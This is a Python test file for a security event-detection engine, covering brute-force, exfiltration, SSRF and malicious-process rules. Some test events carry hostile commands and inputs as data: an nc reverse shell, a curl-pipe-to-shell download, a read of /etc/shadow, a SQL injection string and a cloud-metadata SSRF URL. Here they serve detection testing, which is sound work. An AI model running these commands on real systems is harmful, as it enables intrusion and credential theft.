import json
from pathlib import Path
from processor.rule_engine import RuleEngine, Rule, match, detection_match
from processor.processor import EventProcessor
from processor.scorer import DummyScorer
from processor.features import build_features

RULES = Path(__file__).resolve().parents[1] / 'rules' / 'sigma'


# --------------------------------------------------------------------------- existing rule tests

def test_brute_force_window():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'login', 'status': 'failure', 'ip': '10.0.0.1', 'user': 'alice'}
    for i in range(4):
        assert not e.evaluate(x, now=float(i))
    assert any(h.rule_id == 'brute_force' for h in e.evaluate(x, now=4))


def test_suspicious_login():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'login', 'status': 'failure', 'ip': '10.0.0.2', 'user': 'admin-user'}
    assert any(h.rule_id == 'suspicious_login' for h in e.evaluate(x, now=0))


def test_privilege_escalation():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'process_start', 'status': 'success', 'ip': '10.0.0.3', 'user': 'alice',
         'process': 'sudo systemctl restart nginx'}
    assert any(h.rule_id == 'privilege_escalation' for h in e.evaluate(x, now=0))


def test_suspicious_ip():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'http_request', 'ip': '203.0.113.10', 'user': '-', 'status': 'success'}
    assert any(h.rule_id == 'suspicious_ip' for h in e.evaluate(x, now=0))


def test_suspicious_ip_no_match():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'http_request', 'ip': '192.168.1.1', 'user': '-', 'status': 'success'}
    hits = e.evaluate(x, now=0)
    assert not any(h.rule_id == 'suspicious_ip' for h in hits)


# --------------------------------------------------------------------------- new rule tests

def test_web_scan_rule():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'http_request', 'ip': '10.0.0.50', 'user': '-', 'status': 'failure',
         'path': '/.env', 'http_status': 404}
    for i in range(9):
        hits = e.evaluate(x, now=float(i))
        assert not any(h.rule_id == 'web_scan' for h in hits)
    assert any(h.rule_id == 'web_scan' for h in e.evaluate(x, now=9))


def test_data_exfiltration_rule():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'data_transfer', 'ip': '10.0.0.60', 'user': 'admin2', 'status': 'success',
         'bytes_out': 200_000_000, 'host': 'web-01'}
    hits = e.evaluate(x, now=0)
    assert any(h.rule_id == 'data_exfiltration' for h in hits)


def test_data_exfiltration_no_match_small():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'data_transfer', 'ip': '10.0.0.60', 'user': 'alice', 'status': 'success',
         'bytes_out': 1_000, 'host': 'web-01'}
    hits = e.evaluate(x, now=0)
    assert not any(h.rule_id == 'data_exfiltration' for h in hits)


def test_credential_stuffing_window():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'login', 'status': 'failure', 'ip': '10.0.0.70', 'user': 'victim'}
    for i in range(19):
        e.evaluate(x, now=float(i * 0.5))
    hits = e.evaluate(x, now=9.5)
    assert any(h.rule_id == 'credential_stuffing' for h in hits)


def test_malicious_process_reverse_shell():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'process_start', 'ip': '10.0.0.80', 'user': 'admin1', 'status': 'success',
         'process': 'nc -e /bin/sh 194.36.190.20 4444'}
    hits = e.evaluate(x, now=0)
    assert any(h.rule_id == 'malicious_process' for h in hits)


def test_malicious_process_shadow_read():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'process_start', 'ip': '10.0.0.80', 'user': 'admin1', 'status': 'success',
         'process': 'cat /etc/shadow'}
    hits = e.evaluate(x, now=0)
    assert any(h.rule_id == 'malicious_process' for h in hits)


def test_malicious_process_curl_pipe():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'process_start', 'ip': '10.0.0.80', 'user': 'admin1', 'status': 'success',
         'process': 'curl http://185.220.101.7/x.sh | sh'}
    hits = e.evaluate(x, now=0)
    assert any(h.rule_id == 'malicious_process' for h in hits)


def test_http_flood_window():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'http_request', 'ip': '10.0.0.90', 'user': '-', 'status': 'success',
         'path': '/', 'http_status': 200}
    for i in range(199):
        e.evaluate(x, now=float(i * 0.1))
    hits = e.evaluate(x, now=19.9)
    assert any(h.rule_id == 'http_flood' for h in hits)


# --------------------------------------------------------------------------- modifier unit tests

def test_modifier_equals():
    assert match('login', 'login', 'equals')
    assert not match('login', 'logout', 'equals')


def test_modifier_contains():
    assert match('admin-user', 'admin', 'contains')
    assert match('ADMIN-USER', 'admin', 'contains')
    assert not match('regular-user', 'admin', 'contains')


def test_modifier_startswith():
    assert match('/admin/login', '/admin', 'startswith')
    assert match('/ADMIN/login', '/admin', 'startswith')
    assert not match('/login/admin', '/admin', 'startswith')


def test_modifier_endswith():
    assert match('report.pdf', '.pdf', 'endswith')
    assert match('REPORT.PDF', '.pdf', 'endswith')
    assert not match('report.csv', '.pdf', 'endswith')


def test_modifier_gt():
    assert match(500, 400, 'gt')
    assert not match(400, 400, 'gt')
    assert not match(None, 400, 'gt')


def test_modifier_gte():
    assert match(500, 400, 'gte')
    assert match(400, 400, 'gte')
    assert not match(399, 400, 'gte')


def test_modifier_lt():
    assert match(200, 400, 'lt')
    assert not match(400, 400, 'lt')


def test_modifier_lte():
    assert match(200, 400, 'lte')
    assert match(400, 400, 'lte')
    assert not match(401, 400, 'lte')


def test_modifier_in():
    assert match('203.0.113.10', ['203.0.113.10', '198.51.100.23'], 'in')
    assert not match('192.168.1.1', ['203.0.113.10', '198.51.100.23'], 'in')


def test_modifier_regex():
    assert match('/.env', r'\.env', 'regex')
    assert match("/products?id=1' OR '1'='1", r"OR\s+'", 'regex')
    assert not match('/index.html', r'\.env', 'regex')


# --------------------------------------------------------------------------- condition: any tests

def test_condition_any():
    detection = {'event_type': 'login', 'status': 'failure'}
    event = {'event_type': 'login', 'status': 'success'}
    assert not detection_match(event, detection, 'all')
    assert detection_match(event, detection, 'any')


def test_condition_all():
    detection = {'event_type': 'login', 'status': 'failure'}
    event = {'event_type': 'login', 'status': 'failure'}
    assert detection_match(event, detection, 'all')


# --------------------------------------------------------------------------- enrichment contract

def test_enrichment_contract():
    raw = {'event_id': 'abc', 'event_ts': '2026-10-01T09:15:02.417Z', 'source': 'web',
           'user': '-', 'ip': '10.0.0.1', 'event_type': 'http_request', 'severity': 'medium',
           'status': 'success', 'host': 'web-01', 'bytes_out': 100, 'process': '',
           'method': 'GET', 'path': '/', 'http_status': 200, 'user_agent': 'test', 'response_ms': 12}
    enriched, hits = EventProcessor(RuleEngine([]), DummyScorer()).process(raw)
    assert hits == []
    assert 0 <= enriched['risk_score'] <= 1
    assert enriched['rule_hits'] == []
    assert isinstance(json.loads(enriched['features']), dict)
    assert 'processed_ts' in enriched


def test_enrichment_preserves_all_raw_fields():
    raw = {'event_id': 'xyz', 'event_ts': '2026-10-01T09:15:02.417Z', 'source': 'auth',
           'user': 'alice', 'ip': '10.0.0.1', 'event_type': 'login', 'severity': 'low',
           'status': 'failure', 'host': 'auth-01', 'bytes_out': 312, 'process': '',
           'method': 'POST', 'path': '/login', 'http_status': 401, 'user_agent': 'Mozilla/5.0',
           'response_ms': 161}
    enriched, _ = EventProcessor(RuleEngine([]), DummyScorer()).process(raw)
    for key in raw:
        assert enriched[key] == raw[key], f'raw field {key} was mutated'


# --------------------------------------------------------------------------- features tests

def test_features_sqli_detection():
    event = {'path': "/products?id=1' OR '1'='1", 'process': '', 'user_agent': '', 'status': 'success',
             'event_type': 'http_request', 'http_status': 200, 'response_ms': 10, 'bytes_out': 100,
             'method': 'GET', 'source': 'web'}
    f = build_features(event)
    assert f['path_has_sqli'] is True


def test_features_scanner_ua():
    event = {'path': '/', 'process': '', 'user_agent': 'sqlmap/1.7.2#stable', 'status': 'success',
             'event_type': 'http_request', 'http_status': 200, 'response_ms': 10, 'bytes_out': 100,
             'method': 'GET', 'source': 'web'}
    f = build_features(event)
    assert f['ua_is_scanner'] is True


def test_features_large_bytes():
    event = {'path': '/', 'process': '', 'user_agent': '', 'status': 'success',
             'event_type': 'data_transfer', 'http_status': 200, 'response_ms': 10,
             'bytes_out': 200_000_000, 'method': 'GET', 'source': 'web'}
    f = build_features(event)
    assert f['bytes_out_large'] is True
    assert f['is_data_transfer'] is True


def test_ssrf_rule():
    e = RuleEngine.from_directory(RULES)
    x = {'event_type': 'http_request', 'ip': '10.0.0.95', 'user': '-', 'status': 'success',
         'path': '/profile?url=http://169.254.169.254/latest/meta-data/', 'http_status': 200}
    hits = e.evaluate(x, now=0)
    assert any(h.rule_id == 'ssrf_metadata_probe' for h in hits)


def test_features_ssrf():
    event = {'path': '/api/fetch?url=http://169.254.169.254/computeMetadata/v1/', 'process': '',
             'user_agent': 'curl/8.4.0', 'status': 'success', 'event_type': 'http_request',
             'http_status': 200, 'response_ms': 15, 'bytes_out': 100, 'method': 'GET', 'source': 'web'}
    f = build_features(event)
    assert f['path_has_ssrf'] is True


def test_features_slowloris_timeout():
    event = {'path': '/', 'process': '', 'user_agent': 'Mozilla/5.0 (compatible; Slowloris/1.0)',
             'status': 'failure', 'event_type': 'http_request', 'http_status': 408,
             'response_ms': 35000, 'bytes_out': 100, 'method': 'GET', 'source': 'web'}
    f = build_features(event)
    assert f['is_timeout'] is True
    assert f['response_ms_extreme'] is True
    assert f['ua_is_scanner'] is True

